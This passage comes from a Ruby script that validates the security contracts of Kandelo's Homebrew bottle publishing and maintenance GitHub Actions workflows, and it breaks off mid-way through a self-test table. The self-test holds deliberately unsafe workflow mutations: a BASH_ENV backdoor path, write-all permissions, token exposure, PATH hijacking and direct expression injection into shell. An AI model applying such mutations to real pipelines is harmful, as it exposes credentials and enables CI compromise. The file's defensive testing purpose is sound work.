  canonical_receipt = named_step(verify_steps,
                                 "Validate receipt against exact bottle bytes").fetch("run")
  [canonical_build, canonical_receipt].each do |run|
    check(run.include?('--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"') &&
          run.include?('--out-bottle-json "$RUNNER_TEMP/homebrew-verified-input/bottle.json"'),
          "publisher does not reconstruct canonical bottle JSON")
  end
  check_forbidden_root_args(canonical_build,
                            "publisher verifier handoff validation", trusted_runner_roots)
  check_forbidden_root_args(canonical_receipt,
                            "publisher verifier receipt validation", trusted_runner_roots)
  check(canonical_build.include?('--tap-root "$GITHUB_WORKSPACE/tap"'),
        "publisher does not bind dependency provenance to the exact tap")
  merge_run = named_step(verify_steps,
                         "Compose only reconstructed bottle metadata into the fresh tap").fetch("run")
  [
    "scripts/homebrew-merge-bottle-json.sh", '--bottle-json "$BOTTLE_JSON"',
    '--release-tag "$RELEASE_TAG"',
    '--expected-sha256 "$BOTTLE_SHA256"', '--expected-root-url "$BOTTLE_ROOT_URL"',
    'merged_tap="$RUNNER_TEMP/homebrew-merged-tap"',
    'cp -a "$GITHUB_WORKSPACE/tap" "$merged_tap"',
    '[ "$changed" = "Formula/$FORMULA.rb" ]',
    'bottle merge modified the archived source tap',
  ].each do |fragment|
    check(merge_run.include?(fragment), "publisher canonical bottle merge lacks #{fragment}")
  end

  anonymous_run = named_step(verify_steps,
                             "Select exact anonymous bottle bytes for runtime validation").fetch("run")
  [
    "scripts/homebrew-verify-public-bottle.ts", '--url "$BOTTLE_URL"',
    '--sha256 "$BOTTLE_SHA256"', '--bytes "$BOTTLE_BYTES"', '--out "$runtime_bottle"',
    'actual_sha="$(sha256sum "$runtime_bottle"',
  ].each do |fragment|
    check(anonymous_run.include?(fragment), "publisher anonymous bottle readback lacks #{fragment}")
  end
  check((credential_names & anonymous_run.scan(/[A-Z][A-Z0-9_]+/)).empty?,
        "publisher anonymous bottle readback references a credential")
  index_verify_run = named_step(
    verify_steps, "Validate exact public Homebrew index traversal without credentials"
  ).fetch("run")
  [
    "public Homebrew index verifier received $secret_name",
    "validate-index-receipt", "validate-publication-receipt", "--kind index",
    "oras cp", "--from-registry-config", "--to-oci-layout",
    "scripts/homebrew-oci-layout.py validate-index",
    '.manifest_digest == $child[0].oci.manifest.digest',
    '.bottle_sha256 == $child[0].bottle.sha256',
  ].each do |fragment|
    check(index_verify_run.include?(fragment),
          "publisher exact public Homebrew index verification lacks #{fragment}")
  end
  full_fetch_run = named_step(verify_steps,
                              "Fetch the complete ABI browser runtime graph").fetch("run")
  check(full_fetch_run.include?("bash scripts/dev-shell.sh bash scripts/fetch-binaries.sh --fetch-only"),
        "publisher browser verification does not fetch the complete ABI runtime graph")
  sidecar_run = named_step(verify_steps,
                           "Generate sidecars from the selected bottle").fetch("run")
  check(sidecar_run.include?('KANDELO_HOMEBREW_BOTTLE_ARCHIVE="$RUNTIME_BOTTLE"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_TAP_ROOT="$RUNNER_TEMP/homebrew-merged-tap-postverify"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_FORMULA_SOURCE_ROOT="$GITHUB_WORKSPACE/tap-postverify"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_BOTTLE_JSON="$RUNNER_TEMP/homebrew-verified-input/bottle.json"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_DEPENDENCY_PROVENANCE="$DEPENDENCY_PROVENANCE"') &&
        sidecar_run.include?("scripts/homebrew-generate-sidecars-from-env.sh"),
        "publisher sidecars do not use archived Formula facts and the anonymously selected bottle")
  forbidden_root_json_fragments = [
    'export KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$(jq -cn \\',
    '--arg github_workspace "$GITHUB_WORKSPACE" \\',
    '--arg runner_workspace "$(dirname "$GITHUB_WORKSPACE")" \\',
    '--arg runner_temp "$RUNNER_TEMP" \\',
    '--arg build_home "/home/kandelo-homebrew-build" \\',
    "'[\u0024github_workspace, \u0024runner_workspace, \u0024runner_temp, \u0024build_home]')\"",
  ]
  forbidden_root_json_fragments.each do |fragment|
    check(sidecar_run.include?(fragment),
          "publisher sidecar inspection lacks trusted forbidden-root source #{fragment}")
  end
  forbidden_root_forwarding = [
    'bash scripts/dev-shell.sh env \\',
    'KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON" \\',
  ]
  forbidden_root_forwarding.each do |fragment|
    check(sidecar_run.include?(fragment),
          "publisher sidecar inspection drops trusted forbidden roots at the dev-shell boundary")
  end
  verifier_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-generate-sidecars-from-env.sh"))
  fingerprint_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-sysroot-fingerprint.sh"))
  merge_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-merge-bottle-json.sh"))
  check_sidecar_sysroot_binding(verifier_source, fingerprint_source)
  check(verifier_source.include?('KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON') &&
        verifier_source.include?('forbidden_roots = json.loads') &&
        verifier_source.include?('inspection_command.extend(("--forbidden-root", forbidden_root))'),
        "sidecar generator does not preserve trusted forbidden-root inspection")
  [verifier_source, merge_source].each do |source|
    check(!source.include?("HOMEBREW_BREW_FILE") &&
          !source.include?("brew info") &&
          !source.include?("bottle --merge") &&
          !source.include?("homebrew-patched-launcher"),
          "post-build verifier evaluates Formula Ruby through Homebrew")
  end
  browser_run = named_step(verify_steps,
                           "Build and strictly smoke the hello browser image").fetch("run")
  [
    "bash -c", "KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=1",
    "--reporter=json", ".stats.expected == 1", ".stats.unexpected == 0",
    ".stats.flaky == 0", ".stats.skipped == 0",
  ].each do |fragment|
    check(browser_run.include?(fragment), "publisher strict browser smoke lacks #{fragment}")
  end
  forbidden_root_json_fragments.each do |fragment|
    check(browser_run.include?(fragment),
          "publisher browser sidecar regeneration lacks trusted forbidden-root source #{fragment}")
  end
  forbidden_root_forwarding.each do |fragment|
    check(browser_run.include?(fragment),
          "publisher browser sidecar regeneration drops trusted forbidden roots at the dev-shell boundary")
  end

  package_handoff_run = named_step(verify_steps,
                                   "Package validated data-only publication handoff").fetch("run")
  [
    'mkdir -p "$publish_handoff/build" "$publish_handoff/composition"',
    'homebrew-build-handoff/manifest.json', 'homebrew-build-handoff/bottle.json',
    'homebrew-build-handoff/dependency-provenance.json',
    'cp "$RUNTIME_BOTTLE" "$publish_handoff/build/bottle.tar.gz"', "receipt.json",
    'homebrew-sidecars/sidecars-input.json',
    '.packages[0].bottles[0].bottle_file = "../build/bottle.tar.gz"',
    "scripts/homebrew-validate-publish-handoff.sh",
  ].each do |fragment|
    check(package_handoff_run.include?(fragment), "publisher publication handoff lacks #{fragment}")
  end
  check_forbidden_root_args(package_handoff_run,
                            "publisher publication handoff validation", trusted_runner_roots)
  check(!package_handoff_run.include?("sidecars/Formula") &&
        !package_handoff_run.include?("sidecars/Kandelo"),
        "publisher publication handoff carries stale precomputed tap state")
  check(!package_handoff_run.match?(/(?:^|\s)(?:cp|rsync)[^\n]*(?:scripts?|\.env)(?:\s|\/|$)/),
        "publisher publication handoff includes executable or environment data")

  payload_validation = named_step(finalize_steps,
                                  "Validate the complete data-only publication payload")
  publish_checkout = named_step(finalize_steps,
                                "Checkout tap publication branch after payload validation")
  check(payload_validation["id"] == "validate-payload" &&
        payload_validation["continue-on-error"] == true &&
        payload_validation.fetch("run").include?("scripts/homebrew-validate-publish-handoff.sh") &&
        finalize_steps.index(payload_validation) < finalize_steps.index(publish_checkout),
        "publisher finalizer does not validate the strict handoff before credentialed checkout")
  check_forbidden_root_args(payload_validation.fetch("run"),
                            "publisher final payload validation", trusted_runner_roots)
  forbidden_root_lines = values_for_key(workflow, "run").flat_map do |run|
    next [] unless run.is_a?(String)
    run.lines.filter_map do |line|
      stripped = line.strip.delete_suffix(" \\")
      stripped if stripped.start_with?("--forbidden-root ")
    end
  end
  check(forbidden_root_lines.length == 34,
        "publisher does not pass the exact trusted forbidden-root set at every archive boundary")
  check(forbidden_root_lines.none? { |line| line.include?("linuxbrew") || line.include?("/opt/") },
        "publisher forbids canonical Homebrew prefix or opt metadata")
  publish_step = named_step(finalize_steps, "Publish validated sidecars under the tap state lock")
  publish_run = publish_step.fetch("run")
  check(publish_run.include?("scripts/homebrew-publish-sidecars.sh") &&
        publish_run.include?('--publication-handoff "$RUNNER_TEMP/homebrew-publish-handoff"') &&
        !publish_run.include?("--sidecar-root"),
        "publisher finalizer bypasses under-lock package composition")
  check(!finalize_steps.filter_map { |step| step["run"] }.join("\n").match?(/(?:^|\s)brew(?:\s|$)/) &&
        !finalize_steps.filter_map { |step| step["run"] }.join("\n").include?(
          "homebrew-generate-sidecars-from-env.sh"
        ), "credentialed finalizer evaluates Homebrew or Formula code")
  check(finalize_steps.none? { |step| step["uses"] == UPLOAD_ACTION } &&
        finalize_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") },
        "credentialed finalizer publishes diagnostics")

  report_checkout = named_step(finalize_steps,
                               "Checkout clean tap for a failed-attempt report")
  report = named_step(finalize_steps,
                      "Record failed attempt without replacing last-green metadata")
  final_fail = named_step(finalize_steps, "Fail after reporting an unsuccessful matrix entry")
  check(report_checkout["if"] == failure_condition && report["if"] == failure_condition &&
        final_fail["if"] == failure_condition,
        "publisher failed-attempt path changed")
  report_run = report.fetch("run")
  check(report_run.include?('--tap-root "$GITHUB_WORKSPACE/tap-report"') &&
        !report_run.include?("tap-publish") && !report_run.include?("homebrew-finalize-error.txt") &&
        report_run.include?('error_text="publish-handoff=$PUBLISH_HANDOFF_OUTCOME; '),
        "publisher failure report does not use a clean checkout and sanitized outcomes")

  check(!values_for_key(workflow, "run").join("\n").include?("GITHUB_SHA"),
        "publisher uses caller-context SHA as source provenance")
  check(contract_digest(plan_steps) == PUBLISHER_PLAN_DIGEST,
        "publisher plan step contract changed")
  check(contract_digest(build_steps) == PUBLISHER_BUILD_DIGEST,
        "publisher build step contract changed")
  check(contract_digest(upload_steps) == PUBLISHER_UPLOAD_DIGEST,
        "publisher upload step contract changed")
  check(contract_digest(index_steps) == PUBLISHER_INDEX_DIGEST,
        "publisher version-index step contract changed")
  check(contract_digest(verify_steps) == PUBLISHER_VERIFY_DIGEST,
        "publisher verification step contract changed")
  check(contract_digest(finalize_steps) == PUBLISHER_FINALIZE_DIGEST,
        "publisher finalization step contract changed")
end

def check_maintenance(workflow)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[concurrency jobs name on],
        "maintenance has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Kandelo Homebrew bottle maintenance",
        "maintenance name changed")
  check(workflow["concurrency"] == {
    "group" => "kandelo-homebrew-bottle-maintenance-Automattic-kandelo-homebrew-" \
               "${{ inputs.release-tag || github.run_id }}",
    "cancel-in-progress" => false,
  }, "maintenance concurrency contract changed")

  events = workflow_events(workflow)
  check(events.keys == ["workflow_call"], "maintenance must only expose workflow_call")
  workflow_call = events.fetch("workflow_call")
  check(workflow_call.keys == ["inputs"], "maintenance workflow_call contract changed")
  check(workflow_call["inputs"] == {
    "mode" => { "type" => "string", "default" => "rebuild" },
    "formulae" => { "type" => "string", "required" => true },
    "arches" => { "type" => "string", "default" => "wasm32" },
    "release-tag" => { "type" => "string", "default" => "" },
    "expected-cache-keys" => { "type" => "string", "default" => "" },
    "force" => { "type" => "boolean", "default" => false },
    "rollback-reason" => { "type" => "string", "default" => "" },
    "rollback-ref" => { "type" => "string", "default" => "" },
    "deleted-package-url" => { "type" => "string", "default" => "" },
    "deletion-reason" => { "type" => "string", "default" => "" },
  }, "maintenance inputs changed")
  check(!workflow.key?("permissions"), "maintenance requests workflow permissions")
  check_common(workflow, "maintenance workflow")

  jobs = workflow_jobs(workflow)
  check(jobs.keys.sort == %w[rebuild rollback validate], "maintenance has an unexpected job set")
  validate = jobs.fetch("validate")
  rebuild = jobs.fetch("rebuild")
  rollback = jobs.fetch("rollback")
  check(validate.keys.sort == %w[permissions runs-on steps],
        "maintenance validation job changed")
  check(validate["runs-on"] == "ubuntu-latest" && validate["permissions"] == {},
        "maintenance validation authority changed")
  validate_steps = job_steps(validate, "maintenance validate")
  check(contract_digest(validate_steps) == MAINTENANCE_VALIDATE_DIGEST,
        "maintenance validation step contract changed")
  validate_step = named_step(validate_steps, "Validate maintenance mode")
  check(validate_step["env"] == {
    "CALLER_EVENT_NAME" => "${{ github.event_name }}",
    "CALLER_REF" => "${{ github.ref }}",
    "CALLER_REPOSITORY" => "${{ github.repository }}",
    "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
    "MODE" => "${{ inputs.mode }}",
  }, "maintenance caller validation mapping changed")
  validate_run = validate_step.fetch("run")
  [
    '[ "$CALLER_REPOSITORY" = "Automattic/kandelo-homebrew" ]',
    '[ "$CALLER_REF" = "refs/heads/main" ]',
    '[ "$CALLER_EVENT_NAME" = "repository_dispatch" ]',
    "maintain-bottles.yml@refs/heads/main",
    "rebuild|rollback",
  ].each do |fragment|
    check(validate_run.include?(fragment), "maintenance validation lacks #{fragment}")
  end

  expected_rebuild_permissions = { "contents" => "write", "packages" => "write", "actions" => "read" }
  check(rebuild.keys.sort == %w[if needs permissions uses with] &&
        rebuild["needs"] == ["validate"] &&
        rebuild["if"] == "${{ inputs.mode == 'rebuild' }}" &&
        exact_permissions?(rebuild["permissions"], expected_rebuild_permissions) &&
        rebuild["uses"] == "./.github/workflows/reusable-homebrew-bottle-publish.yml",
        "maintenance rebuild execution contract changed")
  check(rebuild["with"] == {
    "kandelo-repository" => "Automattic/kandelo",
    "kandelo-ref" => "main",
    "tap-repository" => "Automattic/kandelo-homebrew",
    "tap-ref" => "main",
    "formulae" => "${{ inputs.formulae }}",
    "arches" => "${{ inputs.arches }}",
    "release-tag" => "${{ inputs.release-tag }}",
    "expected-cache-keys" => "${{ inputs.expected-cache-keys }}",
    "force" => "${{ inputs.force }}",
    "dry-run" => false,
  }, "maintenance rebuild input wiring changed")

  expected_rollback_permissions = { "contents" => "write", "packages" => "read", "actions" => "read" }
  check(rollback.keys.sort == %w[if needs permissions runs-on steps timeout-minutes] &&
        rollback["needs"] == ["validate"] &&
        rollback["if"] == "${{ inputs.mode == 'rollback' }}" &&
        rollback["runs-on"] == "ubuntu-latest" &&
        rollback["timeout-minutes"] == 30 &&
        exact_permissions?(rollback["permissions"], expected_rollback_permissions),
        "maintenance rollback execution contract changed")
  rollback_steps = job_steps(rollback, "maintenance rollback")
  check(contract_digest(rollback_steps) == MAINTENANCE_ROLLBACK_DIGEST,
        "maintenance rollback step contract changed")
  check(values_for_key(workflow, "uses").sort == [
    "./.github/workflows/reusable-homebrew-bottle-publish.yml",
    CHECKOUT_ACTION,
    CHECKOUT_ACTION,
    NIX_ACTION,
  ].sort, "maintenance action set or pin changed")

  checkouts = rollback_steps.select { |step| step["uses"] == CHECKOUT_ACTION }
  check(checkouts.map { |step| { "name" => step["name"], "with" => step["with"] } } == [
    {
      "name" => "Checkout tap",
      "with" => {
        "repository" => "Automattic/kandelo-homebrew",
        "ref" => "main",
        "path" => "tap",
        "fetch-depth" => 0,
      },
    },
    {
      "name" => "Checkout Kandelo workflow source",
      "with" => {
        "persist-credentials" => false,
        "repository" => "Automattic/kandelo",
        "ref" => "main",
        "path" => "kandelo",
        "submodules" => false,
      },
    },
  ], "maintenance rollback checkout mapping changed")

  record = named_step(rollback_steps, "Record rollback without replacing last-green metadata")
  record_run = record.fetch("run")
  [
    '[[ "$KANDELO_HOMEBREW_FORMULA" =~ ^[a-z0-9][a-z0-9._-]*$ ]]',
    'case "$KANDELO_HOMEBREW_ARCH" in',
    "wasm32|wasm64) ;;",
    '[[ "$KANDELO_HOMEBREW_RELEASE_TAG" =~ ^bottles-abi-v[1-9][0-9]*$ ]]',
  ].each do |fragment|
    check(record_run.include?(fragment), "maintenance rollback lacks #{fragment}")
  end
end

def expect_rejection(label)
  rejected = false
  begin
    yield
  rescue KeyError, RuntimeError
    rejected = true
  end
  check(rejected, "self-test accepted #{label}")
end

def mutate_named_step(workflow, job_name, step_name)
  steps = workflow.fetch("jobs").fetch(job_name).fetch("steps")
  step = steps.find { |candidate| candidate["name"] == step_name }
  raise "self-test could not find #{step_name}" unless step
  step
end

def self_test(publisher, maintenance)
  fixture = YAML.safe_load(<<~YAML, aliases: false)
    on:
      workflow_dispatch: {}
    permissions: write-all
    jobs:
      unsafe:
        steps:
          - uses: actions/cache/restore@v4
          - run: echo "${{ inputs.formulae }}"
          - uses: actions/checkout@v6
  YAML
  check(workflow_events(fixture).key?("workflow_dispatch"), "self-test missed workflow_dispatch")
  expect_rejection("mutable action and cache state") { check_common(fixture, "fixture") }

  sidecar_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-generate-sidecars-from-env.sh"))
  fingerprint_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-sysroot-fingerprint.sh"))
  expect_rejection("wasm64 sidecar fingerprint rebound to wasm32") do
    check_sidecar_sysroot_binding(sidecar_source, fingerprint_source.sub(
      'wasm64) SYSROOT_LIBC="$KANDELO_ROOT/sysroot64/lib/libc.a" ;;',
      'wasm64) SYSROOT_LIBC="$KANDELO_ROOT/sysroot/lib/libc.a" ;;'
    ))
  end
  expect_rejection("sidecar fingerprint bypasses selected sysroot") do
    check_sidecar_sysroot_binding(sidecar_source.sub(
      'homebrew-sysroot-fingerprint.sh', 'homebrew-ignored-fingerprint.sh'
    ), fingerprint_source)
  end

  publisher_mutations = {
    "top-level environment injection" => lambda { |w| w["env"] = { "BASH_ENV" => "/tmp/backdoor" } },
    "workflow write permission" => lambda { |w| w["permissions"] = "write-all" },
    "direct dispatch" => lambda { |w| workflow_events(w)["workflow_dispatch"] = {} },
    "extra publisher input" => lambda { |w|
      workflow_events(w).fetch("workflow_call").fetch("inputs")["command"] = {
        "type" => "string", "default" => "true",
      }
    },
    "caller feature branch" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub("refs/heads/main", "refs/heads/feature")
    },
    "dry-run feature workflow" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub("dry-run-bottles.yml@refs/heads/main",
                                           "feature.yml@refs/heads/feature")
    },
    "wrong caller event" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step.fetch("env")["CALLER_EVENT_NAME"] = "push"
    },
    "release tag ABI bypass" => lambda { |w|
      step = mutate_named_step(w, "plan", "Resolve release and bottle root")
      step["run"] = step.fetch("run").sub('[ "$release_tag" != "$expected_release_tag" ]', "false")
    },
    "uploader dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle")["needs"] = ["plan"]
    },
    "version-index dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("publish-bottle-index")["needs"] = ["plan", "upload-bottle"]
    },
    "verifier dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle")["needs"] = ["plan", "upload-bottle"]
    },
    "finalizer dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("finalize-tap")["needs"] = ["plan", "verify-bottle"]
    },
    "build authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("build-and-test").fetch("permissions")["packages"] = "write"
    },
    "uploader authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle").fetch("permissions")["contents"] = "write"
    },
    "version-index authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("publish-bottle-index").fetch("permissions")["contents"] = "write"
    },
    "version-index serialization bypass" => lambda { |w|
      w.fetch("jobs").fetch("publish-bottle-index").delete("concurrency")
    },
    "verifier authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle").fetch("permissions")["packages"] = "read"
    },
    "finalizer authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("finalize-tap").fetch("permissions")["packages"] = "write"
    },
    "dry-run bottle upload" => lambda { |w|
      job = w.fetch("jobs").fetch("upload-bottle")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "dry-run version-index publication" => lambda { |w|
      job = w.fetch("jobs").fetch("publish-bottle-index")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "dry-run tap finalization" => lambda { |w|
      job = w.fetch("jobs").fetch("finalize-tap")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "unreviewed Kandelo ref" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout Kandelo workflow source")
      step.fetch("with")["ref"] = "feature"
    },
    "persisted source credentials" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout tap")
      step.fetch("with")["persist-credentials"] = true
    },
    "persisted verifier credentials" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Checkout exact tap source")
      step.fetch("with")["persist-credentials"] = true
    },
    "build token exposure" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Build and test Homebrew bottle without publisher credentials")
      step["env"]["GH_TOKEN"] = "${{ github.token }}"
    },
    "Formula test runtime source fallback" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize shell-script runtime for Formula tests")
      step["run"] = step.fetch("run").sub("--fetch-only resolve", "resolve")
    },
    "fork-instrument host tool build bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Build fork-instrument host tool")
      step["run"] = "true"
    },
    "wasm64 Formula target sysroot bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Build Kandelo sysroot")
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh --arch wasm64posix",
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh"
      )
    },
    "wasm64 sidecar target sysroot bypass" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build Kandelo sysroot for sidecar evidence")
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh --arch wasm64posix",
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh"
      )
    },
    "Formula test runtime architecture drift" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize shell-script runtime for Formula tests")
      step["run"] = step.fetch("run").sub("--arch wasm32", "--arch wasm64")
    },
    "Formula test runtime package drift" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize shell-script runtime for Formula tests")
      step["run"] = step.fetch("run").sub("dash coreutils grep sed", "dash")
    },
    "Formula test runtime ordering bypass" => lambda { |w|
      steps = w.fetch("jobs").fetch("build-and-test").fetch("steps")
      runtime_index = steps.index do |step|
        step["name"] == "Materialize shell-script runtime for Formula tests"
      end
      formula_index = steps.index do |step|
        step["name"] == "Build and test Homebrew bottle without publisher credentials"
      end
      steps[runtime_index], steps[formula_index] = steps[formula_index], steps[runtime_index]
    },
    "Formula browser runtime bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Provision Formula browser runtime")
      step["run"] = step.fetch("run").sub(
        "scripts/homebrew-provision-formula-browser.sh", "true #"
      )
    },
    "Formula browser hosted Node bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Provision Formula browser runtime")
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh env", "env"
      )
    },
    "Formula browser Node provenance bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Provision Formula browser runtime")
      step["run"] = step.fetch("run").sub(
        "/nix/store/*/bin/node) ;;", "*) ;;"
      )
    },
    "Formula browser runtime ordering bypass" => lambda { |w|
      steps = w.fetch("jobs").fetch("build-and-test").fetch("steps")
      browser_index = steps.index { |step| step["name"] == "Provision Formula browser runtime" }
      formula_index = steps.index do |step|
        step["name"] == "Build and test Homebrew bottle without publisher credentials"
      end
      steps[browser_index], steps[formula_index] = steps[formula_index], steps[browser_index]
    },
    "Formula build identity bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Create isolated Formula execution identity")
      step["run"] = step.fetch("run").sub(
        'echo "KANDELO_HOMEBREW_BUILD_USER=$build_user"', 'echo "IGNORED_BUILD_USER=$build_user"'
      )
    },
    "Formula process control-group bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Create isolated Formula execution identity")
      step["run"] = step.fetch("run").sub(
        'echo "KANDELO_HOMEBREW_SYSTEMD_RUN_BIN=$systemd_run_bin"',
        'echo "IGNORED_SYSTEMD_RUN_BIN=$systemd_run_bin"'
      )
    },
    "Formula build identity retirement bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Retire isolated Formula execution identity")
      step["run"] = step.fetch("run").sub(
        '"$sudo_bin" -n -- "$userdel_bin" -r "$build_user"', "true #"
      )
    },
    "post-build validator source reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Checkout exact post-build Kandelo validator source")
      step.fetch("with")["path"] = "kandelo"
    },
    "post-build reviewed tap reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout exact post-build tap source")
      step.fetch("with")["path"] = "tap"
    },
    "Formula source closure bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Recheck reviewed sources after Formula execution")
      step["run"] = step.fetch("run").sub(
        "scripts/homebrew-validate-formula-source-closure.sh", "true #"
      )
    },
    "Formula source closure mutable validator reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Recheck reviewed sources after Formula execution")
      step["run"] = step.fetch("run").sub("kandelo-postbuild", "kandelo")
    },
    "Formula source closure mutable tap baseline" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Recheck reviewed sources after Formula execution")
      step["run"] = step.fetch("run").sub(
        '--reviewed-tap-root "$GITHUB_WORKSPACE/tap-reviewed"', ""
      )
    },
    "handoff mutable validator reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Create strict bottle data handoff")
      step["run"] = step.fetch("run").sub("kandelo-postbuild", "kandelo")
    },
    "OCI child composition before source revalidation" => lambda { |w|
      steps = w.fetch("jobs").fetch("build-and-test").fetch("steps")
      closure = steps.index { |step| step["name"] == "Recheck reviewed sources after Formula execution" }
      compose = steps.index do |step|
        step["name"] == "Compose deterministic Homebrew OCI child without credentials"
      end
      steps[closure], steps[compose] = steps[compose], steps[closure]
    },
    "verifier token exposure" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Select exact anonymous bottle bytes for runtime validation")
      step["env"]["GH_TOKEN"] = "${{ github.token }}"
    },
    "mutable Homebrew source" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout reviewed Homebrew implementation")
      step.fetch("with")["ref"] = "main"
    },
    "noncanonical Homebrew prefix" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Activate reviewed Homebrew implementation")
      step["run"] = step.fetch("run").sub("/home/linuxbrew/.linuxbrew", "/tmp/homebrew")
    },
    "writable Homebrew prefix on job PATH" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Activate reviewed Homebrew implementation")
      step["run"] = "echo \"$brew_prefix/bin\" >> \"$GITHUB_PATH\"\n#{step.fetch('run')}"
    },
    "mutable external action" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle", "Download strict build handoff")
      step["uses"] = "actions/download-artifact@main"
    },
    "direct expression in shell" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Warm Kandelo dev shell")
      step["run"] = "echo '${{ inputs.formulae }}'\n#{step.fetch('run')}"
    },
    "handoff retry collision" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Upload strict bottle build handoff")
      step.fetch("with")["name"] = "homebrew-build-handoff-${{ matrix.formula }}-${{ matrix.arch }}"
    },
    "unvalidated uploader ordering" => lambda { |w|
      steps = w.fetch("jobs").fetch("upload-bottle").fetch("steps")
      validate_index = steps.index { |step| step["name"] == "Validate build data before exposing upload credentials" }
      upload_index = steps.index { |step| step["name"] == "Upload validated bottle in isolated ORAS auth state" }
      steps[validate_index], steps[upload_index] = steps[upload_index], steps[validate_index]
    },
    "uploader validation outcome bypass" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle",
                               "Upload validated bottle in isolated ORAS auth state")
      step.delete("if")
    },
    "direct ORAS upload bypass" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle", "Upload validated bottle in isolated ORAS auth state")
      step["run"] = step.fetch("run").sub("scripts/homebrew-ghcr-upload.sh", "oras push")
    },
    "credentialed uploader diagnostics" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle").fetch("steps") << {
        "name" => "Upload diagnostics", "uses" => UPLOAD_ACTION,
        "with" => { "name" => "diagnostics", "path" => "${{ runner.temp }}" },
      }
    },
    "version-index Formula Ruby execution" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index", "Compose one complete Homebrew version index without credentials"
      )
      step["run"] = "ruby Formula/hello.rb\n#{step.fetch('run')}"
    },
    "unvalidated child publication receipt" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index",
        "Validate child layouts and public publication evidence without credentials"
      )
      step["run"] = step.fetch("run").sub("validate-publication-receipt", "validate-child-receipt")
    },
    "unbounded existing index descriptor" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index", "Import the existing public Homebrew version index anonymously"
      )
      step["run"] = step.fetch("run").sub(
        "scripts/homebrew-oci-layout.py import-public-index", "oras cp"
      )
    },
    "version-index sibling preservation bypass" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index", "Compose one complete Homebrew version index without credentials"
      )
      step["run"] = step.fetch("run").sub('args+=(--existing-layout "$existing")', "true")
    },
    "direct version-index ORAS upload bypass" => lambda { |w|
      step = mutate_named_step(
